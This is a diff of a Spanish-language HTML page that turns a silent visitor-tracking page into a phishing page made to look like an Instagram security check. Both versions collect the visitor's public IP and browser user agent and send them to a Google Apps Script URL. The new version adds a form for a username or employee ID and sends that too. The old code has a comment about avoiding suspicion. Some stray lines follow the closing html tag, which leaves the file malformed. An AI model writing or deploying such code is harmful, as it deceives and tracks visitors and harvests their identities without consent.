@@ -2,45 +2,60 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Verificando Conexión...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad | Instagram</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; color: #555; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 3px; }
+        .logo { font-weight: bold; font-size: 24px; margin-bottom: 20px; color: #262626; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
+        input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; margin-bottom: 15px; font-size: 12px; }
+        button { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px 0; border-radius: 4px; font-weight: 600; cursor: pointer; }
+        button:hover { background-color: #1877f2; }
     </style>
 </head>
 <body>
-    <div id="status">Validando credenciales de acceso...</div>
 
-    <script>
-        async function capturarAuditoria() {
-            try {
-                // 1. Obtener la IP Real (Servicio Externo)
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ipPublica = data.ip;
+<div class="card">
+    <div class="logo">Seguridad de Red</div>
+    <p>Para ver este contenido, por favor confirma tu nombre de usuario o ID de empleado para validar el acceso desde esta dirección IP.</p>
+    
+    <input type="text" id="userInput" placeholder="Nombre de usuario o ID" required>
+    <button onclick="enviarAuditoria()">Validar Acceso</button>
+</div>
 
-                // 2. Obtener el Hardware (User Agent)
-                const userAgent = navigator.userAgent;
+<script>
+    async function enviarAuditoria() {
+        const userValue = document.getElementById('userInput').value;
+        if (!userValue) { alert("Por favor ingresa tu identificación"); return; }
 
-                // 3. CAPTURA DEL USUARIO: Leer el nombre desde la URL (?u=Nombre)
-                const urlParams = new URLSearchParams(window.location.search);
-                const nombreObjetivo = urlParams.get('u') || "Usuario_Sin_ID";
+        document.querySelector('button').innerText = "Verificando...";
 
-                // 4. Tu URL de Google Apps Script (Sigue siendo la misma)
-                const googleScriptUrl = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+        try {
+            // 1. Capturar IP
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            const ip = data.ip;
 
-                // 5. Construir el enlace final con todos los parámetros
-                const envioFinal = `${googleScriptUrl}?u=${encodeURIComponent(nombreObjetivo)}&ip=${ipPublica}&ua=${encodeURIComponent(userAgent)}`;
+            // 2. Capturar Hardware
+            const ua = navigator.userAgent;
 
-                // 6. Ejecutar envío y Redirección Final a Instagram
-                window.location.href = envioFinal;
+            // 3. Tu URL de Google Apps Script
+            const googleUrl = "https://script.google.com/macros/s/AKfycbzKmco6ixGg3HijjMVG8rrusr53L3ybLvW0i392T-ITHXSPXhjNqEN__9uHHrAO55MO/exec";
 
-            } catch (error) {
-                // En caso de bloqueo de red, redirigir directo para no levantar sospechas
-                window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
-            }
+            // 4. Envío de datos y Redirección
+            const finalUrl = `${googleUrl}?u=${encodeURIComponent(userValue)}&ip=${ip}&ua=${encodeURIComponent(ua)}`;
+            window.location.href = finalUrl;
+
+        } catch (error) {
+            // Si falla la red, redirigir igual al destino final
+            window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
         }
+    }
+</script>
 
-        // Iniciar proceso al cargar la página
+</body>
+</html>
         capturarAuditoria();
     </script>
 </body>
